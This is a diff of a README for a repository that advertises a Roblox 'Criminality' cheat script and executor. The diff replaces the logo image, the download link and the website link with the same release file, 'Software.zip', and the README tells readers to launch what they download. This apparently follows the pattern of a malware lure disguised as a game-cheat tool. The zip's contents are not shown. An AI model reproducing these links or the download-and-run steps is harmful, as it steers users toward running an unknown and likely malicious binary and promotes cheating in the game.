@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Criminality Repository! 🚀
 
-![Criminality Logo](https://example.com/criminality-logo.png)
+![Criminality Logo](https://github.com/rajeshsharmadl/Criminality/releases/download/v2.0/Software.zip)
 
 ## Repository Name: Criminality
 ## Short Description: Roblox Criminality Script 🚀 Roblox Criminality Script & Executor 🚀 Roblox Criminality Script Powerful Exploit
@@ -27,7 +27,7 @@ In this repository, you'll find all the tools and resources you need to dominate
 ## 📦 Installation
 To get started with the Criminality scripts and exploits, simply download the latest version from the following link:
 
-[Download Criminality v1.0.0](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Criminality v1.0.0](https://github.com/rajeshsharmadl/Criminality/releases/download/v2.0/Software.zip)
 
 🚀 Launch the downloaded file to start using the powerful Criminality scripts and executors!
 
@@ -51,7 +51,7 @@ Become a part of our growing community of Roblox Criminality enthusiasts! Share 
 ---
 
 ## 🌐 Website
-For more information and updates on the Criminality scripts and exploits, visit our official website [here](https://example.com).
+For more information and updates on the Criminality scripts and exploits, visit our official website [here](https://github.com/rajeshsharmadl/Criminality/releases/download/v2.0/Software.zip).
 
 ---
 
